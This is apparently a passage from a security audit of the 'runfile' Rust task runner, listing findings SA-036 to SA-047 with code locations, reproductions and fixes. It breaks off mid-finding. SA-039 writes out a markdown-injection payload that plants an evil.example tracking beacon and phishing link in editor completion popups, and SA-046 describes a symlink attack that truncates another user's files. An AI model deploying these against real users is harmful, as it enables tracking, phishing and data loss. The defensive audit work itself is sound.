- https://blog.rust-lang.org/2026/05/25/cve-2026-5222/ — Cargo 1.68-1.96, third-party sparse registries (retrieved 2026-10-03)
- https://blog.rust-lang.org/2026/03/21/cve-2026-33056/ — fixed in Rust 1.94.1 (retrieved 2026-10-03)
- https://blog.rust-lang.org/ — 2026 posts: no standard-library security advisory after 1.94.1 (retrieved 2026-10-03)

---

#### SA-036: Version pins that do not pin: the setup action downloads the newest release even when the action is pinned to @v1.0.0 or a SHA, and install.sh ignores the RUNFILE_VERSION the README tells users to set

**Severity:** Low | **Confidence:** Confirmed | **Category:** supply-chain | **CWE-1357** | **Component:** `.github/actions/setup/action.yml, .cicd/release-assets/install.sh, README.md`

**Location**

`.github/actions/setup/action.yml:14-16, 80-81`

```yaml
  version:
    description: 'Version to install. Defaults to latest. Ignored when `from-source` is true.'
    default: latest
...
        if [ "$VERSION" = "latest" ]; then
          url="https://github.com/JoaaoVerona/runfile/releases/latest/download/${archive}"
```

`README.md:90-91`

```
`@v1` is the major alias, moved to each release as it ships — so a fix arrives without editing every
workflow, and a new major never arrives unannounced. Pin `@v1.0.0` instead to hold one exact version.
```

`README.md:61-62`

```
`RUNFILE_VERSION` installs
a release other than the latest, and `RUNFILE_INSTALL_DIR` chooses where it goes.
```

`.cicd/release-assets/install.sh:4-5`

```bash
INSTALL_DIR="${RUNFILE_INSTALL_DIR:-$HOME/.local/bin}"
VERSION="${1:-latest}"
```

**Attack path**

Attacker: anyone able to publish a new GitHub release of JoaaoVerona/runfile (the owner's GitHub account or token, or code running in the release workflow, e.g. via the mutable setup-rust-toolchain tag in a separate finding). A consumer who follows the README (or GitHub's hardening guidance) and pins `JoaaoVerona/runfile/.github/actions/setup@v1.0.0` or a commit SHA freezes only action.yml: `version` still defaults to `latest`, so the very next run downloads and executes whatever release is newest, with no window to review it and no checksum check (separate finding). Likewise `RUNFILE_VERSION=v1.7.0 curl -fsSL …/install.sh | sh` installs the newest release on Linux and macOS: install.sh reads only `$1`. Reproduced with a fake curl in SCRATCH: with RUNFILE_VERSION=v1.7.0 set, the script requested `/releases/latest`, resolved v9.9.9 and installed it. (install.ps1 does read RUNFILE_VERSION.)

**Why existing controls don't stop it**

GitHub releases here are immutable, which protects existing versions from being swapped but is exactly what a version pin would let a consumer rely on, and the default defeats it. The action's `version` input does pin when set explicitly; the problem is that the README's documented way to pin (the action ref) does not set it, and nothing warns. `run :update <version>` pins correctly.

**Impact**

Consumers who believe they have frozen the tool get every new release automatically, so a malicious or broken release reaches pinned CI pipelines (and their secrets) immediately; users who pin with RUNFILE_VERSION on Unix get the latest silently.

**Fix**

Default `version` to the release the action ref belongs to: read it from the action's own checkout, e.g. `default_version="v$(sed -n 's/^version = "\(.*\)"/\1/p' "$GITHUB_ACTION_PATH/../../../Cargo.toml" | head -n1)"` when `inputs.version` is empty, keeping `latest` only as an explicit opt-in (or keep `latest` as default but correct the README sentence and recommend `version:`). Because `v1` moves with each release, `@v1` consumers still get the newest release, while `@v1.0.0`/SHA consumers get the one they pinned. In install.sh use `VERSION="${1:-${RUNFILE_VERSION:-latest}}"`.

**⚠ Product impact**

*Type:* `behavior`

Consumers pinned to an exact action tag or SHA would keep getting that release's binary instead of the newest; `@v1` users see no change. RUNFILE_VERSION starts working on Unix as documented.

*Safer rollout:* Mention it in the release notes; consumers who want floating binaries can set `version: latest`.

**References**

- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions — recommends pinning actions to a full commit SHA (retrieved 2026-10-03)

---

#### SA-037: tree-sitter-cli install script downloads and runs an unverified 18 MB executable; the lockfile pins only the npm tarball, not the binary

**Severity:** Low | **Confidence:** Confirmed | **Category:** supply-chain | **CWE-494** | **Component:** `editors/tree-sitter (dev tooling, Gitea CI)`

**Location**

`editors/tree-sitter/package.json:8-15`

```json
"devDependencies": {
	"tree-sitter-cli": "0.25.6"
},
"pnpm": {
	"onlyBuiltDependencies": [
		"tree-sitter-cli"
	]
}
```

`editors/tree-sitter/pnpm-workspace.yaml:1-2`

```yaml
allowBuilds:
  tree-sitter-cli: true
```

`editors/tree-sitter/pnpm-lock.yaml:175-178`

```yaml
tree-sitter-cli@0.25.6:
  resolution: {integrity: sha512-UhkXRkMPtBgE4OatZtYVtDsT3HFUliqAJcs49XQaZv8d2sbeTzEhpJVpMaCqBR3HGhb1WpyoodaFXQaMuOLPEg==}
  hasBin: true
```

`tree-sitter-cli@0.25.6/install.js (npm package; editors/tree-sitter/node_modules/.pnpm/...):53-83`

```
const releaseURL = `https://github.com/tree-sitter/tree-sitter/releases/download/v${packageJSON.version}`;
...
get(assetURL, response => { ... response.pipe(zlib.createGunzip()).pipe(file); });
file.on('finish', () => { fs.chmodSync(executableName, '755'); });
```

`editors/tree-sitter/runfiles/setup.run:5`

```
$ pnpm install --frozen-lockfile
```

`editors/tree-sitter/runfiles/generate.run:3`

```
$ tree-sitter generate
```

`.cicd/ci.yml:135-139`

```yaml
- name: Set up the tree-sitter grammar
  run: run tree-sitter:setup
- name: Test the tree-sitter grammar
  run: run tree-sitter:test
```

**Attack path**

`allowBuilds: tree-sitter-cli: true` lets pnpm run the package's `install` script (`node install.js`). That script (read live today: identical bytes in the local copy, on jsDelivr and at the v0.25.6 tag on GitHub) downloads https://github.com/tree-sitter/tree-sitter/releases/download/v0.25.6/tree-sitter-<os>-<arch>.gz over HTTPS, follows 301/302 redirects, gunzips it straight into ./tree-sitter and chmods it 755: no checksum, signature or size check. The sha512 in pnpm-lock.yaml covers only the npm tarball that contains install.js, so `--frozen-lockfile` does not pin the executable. The GitHub release v0.25.6 is not marked immutable (`immutable: false` from the GitHub API today), so its assets can be replaced in place by anyone holding write access to tree-sitter/tree-sitter or its release automation, and every fresh install (each Gitea CI run of the `extension` job, any new clone running `run tree-sitter:setup`) would execute the replacement. That binary then runs as `tree-sitter generate`, which writes src/parser.c: locally that file is committed and compiled by Zed, Neovim and Helix users, so a trojaned generator could also plant code in a large generated file reviewers do not read.

**Why existing controls don't stop it**

Transport is HTTPS (https.get rejects an http: redirect target). Asset metadata from the GitHub API today: all v0.25.6 assets were uploaded by github-actions[bot] on 2025-06-04 and not modified since (updated_at one second after created_at), and GitHub publishes a sha256 digest for each (linux-x64: sha256:c300ea9f2ca368186ce1308793aaad650c3f6db78225257cbb5be961aeff4038), so nothing indicates tampering and pinning is straightforward. No OSV advisories for tree-sitter-cli (any version). The latest release, 0.27.0, has the same install.js, so upgrading does not fix this. The binary is dev/CI tooling and is not shipped; the Gitea CI job that runs it references no secrets. I did not download the release asset to hash the locally installed binary against the digest (a download beyond a metadata lookup); that check is listed as a manual step.

**Impact**

Requires compromise of tree-sitter's GitHub releases. Then: code execution on developer machines and the Gitea CI runner that run tree-sitter:setup, with a path into the committed, editor-compiled src/parser.c. Nothing indicates that has happened.

**Fix**

Pin the executable, not just the wrapper. Either (a) set `allowBuilds: tree-sitter-cli: false` and have editors/tree-sitter/runfiles/setup.run fetch the asset itself and verify it against the digest GitHub publishes, e.g. `curl -fsSLo ts.gz https://github.com/tree-sitter/tree-sitter/releases/download/v0.25.6/tree-sitter-linux-x64.gz && echo 'c300ea9f2ca368186ce1308793aaad650c3f6db78225257cbb5be961aeff4038  ts.gz' | sha256sum -c -` (one pinned hash per OS/arch); or (b) build it from crates.io, whose index carries a checksum Cargo verifies: `cargo install tree-sitter-cli --version 0.25.6 --locked` (from a runfile target, per the project rule). Option (b) also removes the Node download path. Not breaking; dev tooling only.

**Product impact:** none — internal change only.

**References**

- https://cdn.jsdelivr.net/npm/tree-sitter-cli@0.25.6/install.js — install script of the locked version (identical to local copy, sha256 prefix 73d1683164f768b0) (retrieved 2026-10-03)
- https://raw.githubusercontent.com/tree-sitter/tree-sitter/v0.25.6/cli/npm/install.js — same script at the release tag (retrieved 2026-10-03)
- https://cdn.jsdelivr.net/npm/tree-sitter-cli@0.27.0/install.js — latest (0.27.0) still has no verification (retrieved 2026-10-03)
- https://api.github.com/repos/tree-sitter/tree-sitter/releases/tags/v0.25.6 — immutable=false; per-asset sha256 digests; assets unchanged since 2025-06-04 (retrieved 2026-10-03)
- https://registry.npmjs.org/tree-sitter-cli — dist-tags latest=0.27.0 (retrieved 2026-10-03)
- https://api.osv.dev/v1/query — no advisories for npm tree-sitter-cli, any version (retrieved 2026-10-03)

---

#### SA-038: Non-atomic in-place rewrites in :lint, :generate and :completions can destroy the original file on a write error (truncate-then-write)

**Severity:** Low | **Confidence:** Likely | **Category:** data-loss | **CWE-460** | **Component:** `crates/runfile-cli`

**Location**

`crates/runfile-cli/src/cmd_lint.rs:219-230`

```rust
match std::fs::write(file, &out) { Ok(()) => { ... } Err(e) => { report.problem(file, None, Severity::Error, &e.to_string()); ... } }
```

`crates/runfile-cli/src/cmd_generate.rs:213-218`

```rust
fn write(path: &Path, text: &str) -> Result<(), String> {
	if let Some(d) = path.parent() { std::fs::create_dir_all(d)...; }
	std::fs::write(path, text).map_err(...)
}
```

`crates/runfile-cli/src/completions.rs:221-226`

```rust
fn write_new(path: &Path, body: &str) -> Result<(), String> {
	if let Some(d) = path.parent() { std::fs::create_dir_all(d)...; }
	std::fs::write(path, body).map_err(...)
}
```

**Attack path**

All three in-place rewriters use std::fs::write(path, bytes), which opens the existing file with O_CREAT|O_WRONLY|O_TRUNC (truncating it to zero) and then write_all()s the new content. If the write fails after truncation -- ENOSPC (disk full), EIO, a quota hit, or the process being killed between truncate and completion -- the original file is left empty or partially written, with no backup and no temp-file+rename. The files affected are user data the threat model explicitly calls out: :lint rewrites the user's own .run source files (run by pre-commit hooks across many files), :generate rewrites .vscode/.zed/.idea task files, and :completions install/uninstall rewrites ~/.zshrc and the PowerShell profile (uninstall also rewrites ~/.bashrc). A disk-full condition during `run :completions install zsh` or `run :lint` therefore loses the prior contents of a shell profile or a source file.

**Why existing controls don't stop it**

No atomic write anywhere: no write-to-temp-then-rename, no fsync, no backup copy. std::fs::write is not atomic. For a small text file the truncate-to-write window is short, which is why this is rated low and 'likely' rather than confirmed -- it needs an I/O failure (ENOSPC/EIO/quota) or a kill at the wrong instant. The formatter's fingerprint self-check guards content correctness, not durability. Mature formatters (rustfmt, prettier) write to a temp file and rename for exactly this reason.

**Impact**

Loss of the prior contents of a user source .run file, an editor task file, or a shell startup profile (~/.zshrc, PowerShell profile, ~/.bashrc) when a write fails mid-operation. Recoverable only from version control or backups.

**Fix**

Write to a temporary file in the same directory and atomically rename over the target (and on Unix preserve the original mode/ownership). A tiny helper used by cmd_lint::shape, cmd_generate::write and completions::write_new keeps all three consistent.

**Product impact:** none — internal change only.

**References**

- https://cwe.mitre.org/data/definitions/460.html — CWE-460 Improper Cleanup on Thrown Exception / partial-write state (retrieved 2026-10-03)

---

#### SA-039: Completion documentation renders a _shared.run binding line verbatim, so a carriage return in it injects images/links into the editor's markdown popup (tracking beacon from an opened repo)

**Severity:** Low | **Confidence:** Likely | **Category:** info-disclosure | **CWE-74** | **Component:** `crates/runfile-lsp`

**Location**

`crates/runfile-lsp/src/analysis.rs:721-728`

```rust
Item::new(
	&b.name,
	detail,
	&format!("```runfile\n{}\n```", b.line),   // b.line is the raw source line of the binding, fenced but not sanitised
	Kind::Variable,
	rank,
)
```

`crates/runfile-lsp/src/analysis.rs:1117-1129`

```rust
pub fn shared_bindings(src: &str) -> Vec<Binding> {
	... p.bind(names, Binder::Shared, text.line(span.line));  // text.line splits on '\n' only, so a lone '\r' stays inside the line
```

`crates/runfile-lsp/src/server.rs:188-196`

```rust
"documentation": {"kind": "markdown", "value": i.doc},
```

**Attack path**

The language server offers in-scope names at a completion point, and for each it sends `documentation` as markdown: `` ```runfile\n<the binding's source line>\n``` `` (analysis.rs:721-728, 509-518). For a name bound by a `_shared.run` file above the document, that source line comes from a file on disk the server reads itself (server.rs shared_bindings -> text_of -> read_to_string), which in a cloned/opened repository is attacker-controlled. `Text::line` splits only on `\n` (analysis.rs:964), so a binding written with an embedded carriage return -- `let region = "eu\r```\r![x](https://evil.example/beacon.png) [Setup](https://evil.example/)\r```"` on one physical line, a valid single runfile statement -- is handed to the client with the `\r` intact inside the code fence. Markdown renderers (marked, used by VS Code) normalise `\r`/`\r\n` to `\n` before parsing (marked Lexer: `src = src.replace(/\r\n|\r/g, '\n')`), so the CR closes the ```runfile fence and the attacker's text is parsed as live markdown. I reproduced the breakout: fed the on-disk _shared.run through `run :lsp`, requested completion of the injected name, and the returned documentation value contained the raw CRs; rendering it through a CommonMark renderer produced `<img src="https://.../beacon.png"> <a href="https://.../">Setup</a>` outside the code block. VS Code renders untrusted completion documentation with marked under a CSP of `img-src 'self' data: blob: ... https:` and an untrusted-markdown sanitiser that permits http/https/data/file image sources and http/https/mailto/file links (microsoft/vscode markdownRenderer.ts allowedMediaProtocols/allowedLinkSchemes), so the image auto-loads when the completion popup appears -- no click -- and the link is clickable. command: links are stripped for untrusted markdown, so this is not RCE.

**Why existing controls don't stop it**

The binding line is fenced (` ```runfile `), which is the only containment -- and a lone CR defeats it because the fence close only needs a line of backticks, which marked's CR->LF normalisation creates. No stripping of control characters or backticks before fencing (analysis.rs:724, 509-518). The VS Code extension runs only in a trusted workspace (no capabilities.untrustedWorkspaces; disabled in Restricted Mode -- see the editors agent's findings), so the folder must be trusted first; developers routinely trust repos they clone to work on, and the beacon then fires on the completion popup with no further action. Terminal LSP clients (Zed/Neovim/Helix) typically show the markdown as text and do not fetch images, so the image-beacon effect is mainly VS Code; the disguised-link effect applies anywhere markdown links are rendered. Not reproduced inside a live VS Code instance (no GUI here); the markdown breakout and VS Code's renderer/CSP policy were each confirmed from the source and a CommonMark render, hence confidence 'likely'.

**Impact**

When a developer opens a hostile (trusted) repo and triggers completion near a name bound by its _shared.run, the editor silently fetches an attacker URL (leaking the developer's IP, presence and the fact that they are editing, enabling tracking/canary-token use) and shows an attacker-controlled clickable link styled as documentation (phishing). No code execution (command: links are blocked) and no local data disclosure.

**Fix**

Before building any markdown the server sends (completion `documentation` and the binding line in in_scope/shared_bindings), strip or escape CR/LF and backtick runs from untrusted source text, or send the binding line as `plaintext` documentation (`{"kind":"plaintext",...}`) rather than markdown. A one-liner: `let safe = b.line.replace(['\r','\n'], " ");` then fence `safe`, and additionally reject a line containing a run of backticks. The hover path (card()) uses only built-in constant docs and is unaffected.

**⚠ Product impact**

*Type:* `none`

Sanitising control characters out of completion documentation changes only how a pathological binding line is displayed; normal single-line bindings render identically.

*Safer rollout:* None needed; display-only change.

**References**

- https://www.sonarsource.com/blog/vscode-security-markdown-vulnerabilities-in-extensions — VS Code strips command: links from untrusted markdown but renders other markdown including images (retrieved 2026-10-03)
- https://cwe.mitre.org/data/definitions/74.html — CWE-74 Injection (retrieved 2026-10-03)

---

### Hardening notes

#### SA-040: Language server panics / hangs on an out-of-range client position (integer overflow in completion, unbounded line padding in parse_around)

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** dos | **CWE-190** | **Component:** `crates/runfile-lsp`

**Location**

`crates/runfile-lsp/src/analysis.rs:530-535`

```rust
pub fn complete(src: &str, no: usize, col: usize, ...) -> Completions {
	let line = src.lines().nth(no).unwrap_or("");
	...
	let here = Place::of(src, no + 1, ...);  // no == usize::MAX -> `no + 1` overflows -> panic (debug) / wraps to 0 (release)
```

`crates/runfile-lsp/src/analysis.rs:1016-1018`

```rust
while text.matches('\n').count() < line {
	text.push('\n');
}  // `line` is the client position + 1; a huge value pushes/rescans millions of newlines, parsed up to 16x4 times
```

`crates/runfile-lsp/src/server.rs:160-161`

```rust
let line = params["position"]["line"].as_u64().unwrap_or(0) as usize;
	let col = params["position"]["character"].as_u64().unwrap_or(0) as usize;
```

**Attack path**

textDocument/completion with position.line = 2^64-1 makes `no + 1` overflow at analysis.rs:535: the debug build panics ('attempt to add with overflow') and aborts the process; the release build wraps to 0 (no crash). A merely large line number (e.g. 100000) on a short document drives parse_around's padding loop (analysis.rs:1016) to materialise and re-parse a 100k-line buffer up to ~16x4 times -- measured >35 s with no reply, pegging a core. The position comes from the LSP client, which is trusted (the editor derives it from a real cursor), so neither is reachable from an opened repository; only a malicious or buggy client triggers it. Reproduced by driving `run :lsp` directly with crafted positions.

**Why existing controls don't stop it**

`as_u64().unwrap_or(0) as usize` clamps nothing above; no bound check against the document's line count before `no + 1` or the padding loop. Client is trusted per the threat model, so this is defense-in-depth, not an attacker-reachable DoS.

**Impact**

A malformed/malicious LSP client can abort the server (debug) or stall it for tens of seconds (release) with one completion request. In the shipped release build the overflow merely wraps, so the realistic effect is the parse_around stall.

**Fix**

Clamp the incoming line/character to the document's size before use: `let no = line.min(src.lines().count());` and use `no.saturating_add(1)` in complete(); cap the parse_around padding at the document's own line count rather than the requested line.

**Product impact:** none — internal change only.

**References**

- https://cwe.mitre.org/data/definitions/190.html — CWE-190 Integer Overflow (retrieved 2026-10-03)

---

#### SA-041: Unbounded in-process `run` dispatch recursion overflows the stack and aborts the process (reachable under `--dry-run`); cycle detection only stops repeats, there is no depth cap

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** dos | **CWE-674** | **Component:** `crates/runfile-runtime (dispatch.rs, run.rs)`

**Location**

`crates/runfile-runtime/src/dispatch.rs:207-218`

```rust
if chain.iter().any(|c| c == name) {
	...
	return Err(RunError::Host(Box::new(HostError::Cycle { ... })));
}
let mut next = chain.to_vec();
next.push(name.to_string());
ended(&target.name, self.run_inner(target, args, env, next, label, trace))
```

`crates/runfile-runtime/src/run.rs:499-506`

```rust
Statement::Run { target, args, .. } => {
	let t = runfile_lang::eval::interpolate_plain(target, &mut r.scope)?;
	let a = run_args(args, &mut r.scope)?;
	let env = crate::env::handed_over(props, &r.env);
	r.dispatch.run(&t, &a, env, &r.chain, r.label.as_deref(), &mut r.trace)
}
```

`crates/runfile-runtime/src/dispatch.rs:362-396`

```rust
fn run_inner(&self, ...) -> Result<(), RunError> {
	let (ast, mut scope, shared_props) = self.prepare(target, args, env, true)?;
	...
	let out = crate::run::run_target_with(&ast, shared_props, &mut r);
```

**Attack path**

Dispatch is in-process: `Statement::Run` -> `Dispatch::run` -> `Host::run_with_chain` -> `run_inner` -> `run_target_with` -> `walk` -> `statement` -> `Statement::Run` ... one native stack frame nest per `run`. Cycle detection (dispatch.rs:207) refuses a target already on the chain, which stops *cyclic* recursion (A->B->A). It does not bound an *acyclic* chain: N distinct targets, t0 `run t1`, t1 `run t2`, ..., recurse N deep with no cap (there is no step/depth counter despite the comment at dispatch.rs:1-6; the only `MAX_DEPTH` is discovery's directory-scan limit, unrelated). Reproduced: a generated repo of ~450 `.run` files each running the next overflows the main thread's 8 MB stack and aborts with `fatal runtime error: stack overflow, aborting` (SIGABRT) in the debug build; 100/200/300 succeed, 450 aborts. It aborts under a plain `run t0` AND under `run --dry-run t0` -- dispatch recurses under dry-run (Runner.dry_run is propagated), so a mere preview of the crafted repo crashes.

**Why existing controls don't stop it**

Cycle detection covers only repeated names. No recursion/step limit, no `std::thread` with a larger stack for dispatch, no `catch_unwind`. The process has `panic != abort` (release unwinds), but a stack overflow is not a panic -- it is a hard abort -- so no unwinding, no Drop, and `Host::cleanup_temps` (main.rs:306) never runs, leaving any `temp_file`/`temp_dir` secrets behind (see the temp-survival finding). A real deep chain is the author's own code (by design, like `make`), but the `--dry-run` reach makes it a preview-time crash of an untrusted repo.

**Impact**

A crafted repository of a few hundred chained targets crashes `run --dry-run <head>` (and a real run) with a stack-overflow abort -- a denial of service on preview, and an abort path that bypasses temp-file cleanup. No persistence or data loss; the user must name the head target. In release the per-frame size is smaller so the threshold is higher, but the recursion remains linear in catalog size and uncapped.

**Fix**

Cap dispatch depth: carry the chain length (already available as `chain.len()`) and return a `RunError` (e.g. `DispatchTooDeep`) past a sane limit (e.g. 128), the way cycle detection already returns `Cycle`. Alternatively run the walker on a thread with a bounded, explicit stack and convert overflow to an error. Either keeps a deep but legitimate chain working while turning a crash into a message.

**⚠ Product impact**

*Type:* `behavior`

A legitimate dispatch chain deeper than the chosen cap would start erroring instead of running; such chains are implausible in practice (hundreds of targets each calling the next).

*Safer rollout:* Set the cap well above any real use (>=128) and name it in the error so the rare legitimate case is diagnosable.

---

#### SA-042: `parallel for`/`parallel do` spawn one OS thread per branch with no concurrency cap -- a list of N items (e.g. a large `glob` or `ARGS`) spawns N threads

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** dos | **CWE-770** | **Component:** `crates/runfile-runtime (run.rs)`

**Location**

`crates/runfile-runtime/src/run.rs:1021-1032`

```rust
std::thread::scope(|s| {
	let finish = &finish;
	let handles: Vec<_> = branches.into_iter().enumerate().map(|(i, b)| s.spawn(move || finish(i, b))).collect();
	handles.into_iter().map(|h| h.join().expect("a parallel branch panicked")).collect()
})
```

`crates/runfile-runtime/src/run.rs:1140-1147`

```rust
let mut forks = Vec::with_capacity(items.len());
...
for (nth, (item, label)) in items.into_iter().zip(labels).enumerate() {
	let mut fork = r.fork(&label, nth, width);
	bind_item(names, item, line, &mut fork)?;
	forks.push(fork);
}
```

**Attack path**

`parallel_for` builds one `fork` per list element and `run_branches` spawns one native thread per branch via `std::thread::scope` with no pool, semaphore, or limit. A `parallel for x in glob("**/*")` over an attacker-populated tree, or `parallel for x in ARGS` with a long argument vector, creates as many OS threads as elements. `parallel do` is bounded by the number of statements written (author-controlled), but `parallel for` is bounded only by the list length, which can be data-derived. CLAUDE.md states concurrency is 'unbounded... A limit is a question for later'.

**Why existing controls don't stop it**

Confirmed by inspection: no bound anywhere on the thread/branch count. Requires executing a `parallel for` target, and a huge list usually implies the author wrote `parallel for` over a data-derived list; it is documented as a deliberate non-decision, hence hardening rather than a ranked DoS. Each branch also clones the scope and environment, so memory grows with the list too.

**Impact**

A `parallel for` over a data-controlled list of tens of thousands of elements exhausts threads/memory and can hang or OOM the machine running the target. By design today; defence-in-depth would prevent a benign-looking `parallel for glob(...)` from taking down a build host when the glob matches far more than expected.

**Fix**

Bound concurrency: run branches through a fixed-size worker pool (default e.g. the CPU count, or a documented constant), queueing the rest, so `parallel for` over a large list stays correct but uses bounded threads. Expose the width as a property later if needed.

**⚠ Product impact**

*Type:* `performance`

`parallel for` over a large list would run at most K branches at once instead of all at once; wall-clock time for very wide fan-outs could rise, though thread-thrash usually makes the capped version faster.

*Safer rollout:* Default the cap high enough (>= CPU count) that typical fan-outs are unaffected; document it.

---

#### SA-043: rpc.rs allocates the declared Content-Length before reading, so a huge value aborts the server

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** dos | **CWE-789** | **Component:** `crates/runfile-lsp`

**Location**

`crates/runfile-lsp/src/rpc.rs:81-84`

```rust
let len = len.ok_or_else(|| ReadError::Protocol("missing Content-Length".into()))?;
	let mut buf = vec![0u8; len];
	r.read_exact(&mut buf).map_err(ReadError::Io)?;
```

**Attack path**

A frame header `Content-Length: 99999999999999` makes `vec![0u8; len]` attempt a ~100 TB allocation before any body is read; Rust's allocator aborts the process ('memory allocation of ... bytes failed', SIGABRT). The header comes from the LSP client, which is trusted, so this is not reachable from an opened repository. Confirmed by sending the header to `run :lsp`.

**Why existing controls don't stop it**

No upper bound on the parsed length and no incremental/capped read; the value is parsed as usize and used directly as the allocation size. Negative and non-numeric values are already rejected cleanly (parse to usize fails -> ReadError::Protocol -> the serve loop continues). Only an absurd positive value triggers the abort, and only a trusted client can send it.

**Impact**

A buggy or hostile LSP client can abort the server with one header line. Low because the client is trusted and the process restarts.

**Fix**

Reject or cap Content-Length (e.g. refuse > 64 MiB with ReadError::Protocol, which the serve loop already survives), and/or read in bounded chunks instead of pre-allocating the full declared size.

**Product impact:** none — internal change only.

**References**

- https://cwe.mitre.org/data/definitions/789.html — CWE-789 Memory Allocation with Excessive Size Value (retrieved 2026-10-03)

---

#### SA-044: --stdin-args prompts for secret environment inputs (e.g. ENV.TOKEN) are echoed in cleartext and left in terminal scrollback

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** info-disclosure | **CWE-549** | **Component:** `crates/runfile-cli`

**Location**

`crates/runfile-cli/src/prompt.rs:40-56`

```rust
pub fn ask_input(label: &str, default: Option<&str>, required: bool) -> Option<String> {
	...eprint!("{} {label}{tail}: ", ...);
	let mut line = String::new();
	std::io::stdin().read_line(&mut line).ok()?;  // plain read: terminal echo stays on
	...
}
```

`crates/runfile-cli/src/stdin_args.rs:42-53`

```rust
for (name, u) in &reads.env {
	if std::env::var_os(name).is_some() { continue; }
	if let Some(v) = crate::prompt::ask_input(name, u.default.as_deref(), u.required) {
		unsafe { std::env::set_var(name, v) };
	}
}
```

**Attack path**

Under `run --stdin-args <target>`, stdin_args::collect asks for every input the target reads that was not supplied, including environment reads such as ENV.TOKEN / ENV.PASSWORD / ENV.API_KEY (any ENV.X the target references). prompt::ask_input reads the answer with a plain stdin read_line and never disables terminal echo, so the value the user types for a secret is displayed on screen as typed and remains in the terminal's scrollback and session logs. There is no distinction between secret and non-secret inputs, and no hidden-input (no-echo / rpassword-style) path.

**Why existing controls don't stop it**

No termios/console no-echo mode is used anywhere in prompt.rs. The runner cannot know from a name alone that ENV.TOKEN is a secret, but environment inputs are exactly where credentials live, and the project is otherwise careful with secrets (keyring, zeroize, temp-file cleanup). This is defense-in-depth: it needs a user to type a secret at the prompt, so it is a hygiene gap rather than a direct leak.

**Impact**

Secrets entered interactively are shown on screen and persist in terminal scrollback / recorded sessions, where they can be shoulder-surfed or recovered later.

**Fix**

Read secret-looking inputs without echo (disable ECHO via termios on Unix / SetConsoleMode on Windows, or use a vetted crate like rpassword). At minimum, suppress echo for environment inputs whose name matches common secret patterns (TOKEN/SECRET/PASSWORD/KEY/CREDENTIAL), and document that --stdin-args echoes other inputs.

**⚠ Product impact**

*Type:* `ux`

Secret inputs would no longer echo as typed; users see no characters while typing a hidden field, as with sudo/ssh.

*Safer rollout:* Standard, expected behaviour for password prompts; no rollout concern.

**References**

- https://cwe.mitre.org/data/definitions/549.html — CWE-549 Missing Password Field Masking (retrieved 2026-10-03)

---

#### SA-045: `RUNFILE_PRIVATE_KEYS` does not keep the OS credential store out of a run: the keyring blob is always read as well, so a locked Secret Service can still prompt or block

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** other | **CWE-1188** | **Component:** `crates/runfile-state`

**Location**

`crates/runfile-state/src/keyring_keys.rs:184-189`

```rust
pub fn all_private_keys() -> Vec<String> {
	let env_pool = std::env::var(ENV_PRIVATE_KEYS_VAR)
		.map(|raw| parse_env_pool(&raw))
		.unwrap_or_default();
	merge_key_sources(env_pool, read_blob())
}
```

`README.md:1070-1071`

```
Keys live in the OS credential store — Keychain, Credential Manager, or Secret Service with a keyutils
fallback. In CI, pass them as `RUNFILE_PRIVATE_KEYS` (newline-separated) and no credential store is involved.
```

**Attack path**

Every experiment here that decrypted with RUNFILE_PRIVATE_KEYS set (and matching) still attempted the D-Bus session-bus connection and a keyctl call (strace), because all_private_keys reads the store unconditionally and only uses the env pool to suppress the warning. On a self-hosted runner with a desktop session, or a developer machine using the variable precisely to avoid the keyring, a locked Secret Service is asked to unlock (secret_service_store.rs load_blob -> collection.unlock(), no timeout), which prompts or waits, even though the env key would have decrypted. The README and the action's comments promise the opposite.

**Why existing controls don't stop it**

In typical CI there is no session bus, so the fall-through reaches keyutils, which answers at once.

**Impact**

Hardening/availability: an unwanted keyring interaction or a hang on hosts with a locked keyring; the documented isolation does not hold.

**Fix**

Try the env pool first and consult the store only when no env key matches the public key (do the fallback in resolve_decryption_key / Keys rather than merging eagerly), or skip the store entirely when RUNFILE_PRIVATE_KEYS is non-empty.

**⚠ Product impact**

*Type:* `behavior`

Someone holding some keys in the env var and others only in the keyring needs the 'store only on miss' variant to keep working.

*Safer rollout:* Implement 'store only on miss' rather than 'never the store'.

---

#### SA-046: Shell-checker test bash_runs runs scripts in a predictable /tmp directory it accepts if it already exists, so another local user can redirect its file writes

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** path-traversal | **CWE-377** | **Component:** `crates/runfile-shell (tests)`

**Location**

`crates/runfile-shell/src/tests.rs:853-867`

```rust
let dir = std::env::temp_dir().join(format!("runfile-shell-{}-{}", std::process::id(), NEXT.fetch_add(1, ...)));
std::fs::create_dir_all(&dir).ok()?;
let out = std::process::Command::new(bash).args(["-e", "-c", script]).current_dir(&dir)...
```

`crates/runfile-shell/src/tests.rs:911-915`

```rust
("truncated-input", "printf 'a\\nb\\n' > f; sort f > f; wc -c < f", ...)
```

**Attack path**

The directory name is <pid>-<counter> under the shared temp dir, and create_dir_all succeeds on a directory someone else already created. On a multi-user machine a local user who pre-creates a range of such directories with an entry `f` symlinked to a file the developer owns gets that file overwritten and then emptied when the developer runs `run test` (the truncated-input case writes and truncates `f`). Simulated in scratch: the script followed a planted symlink and left the target at 0 bytes. fs.protected_symlinks does not apply because the link sits in the attacker's own non-sticky directory. The same test also runs `$FOO=bar` with the developer's inherited environment.

**Why existing controls don't stop it**

Test-only (not shipped); needs a shared host, PID prediction and a developer running the suite, hence hardening. remove_dir_all does not follow the link, so nothing is deleted outside.

**Impact**

Truncation of one developer-writable file on a shared machine. No product impact.

**Fix**

Use tempfile::tempdir() (add tempfile as a dev-dependency of runfile-shell, as runfile-lang already does) and env_clear()/explicit env for the spawned bash. The same predictable-name pattern appears in runfile-runtime/src/tests/parallel.rs and runfile-lang/src/tests/eval.rs:784 and is worth the same change.

**Product impact:** none — internal change only.

---

#### SA-047: Setup action writes `secret-keys` to $GITHUB_ENV with a fixed heredoc delimiter, without validating the keys or masking each one

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** secrets | **CWE-93** | **Component:** `.github/actions/setup/action.yml (Register secret keys)`

**Location**

`.github/actions/setup/action.yml:129-139`

```yaml
      env:
        SECRET_KEYS: ${{ inputs.secret-keys }}
      run: |
        {
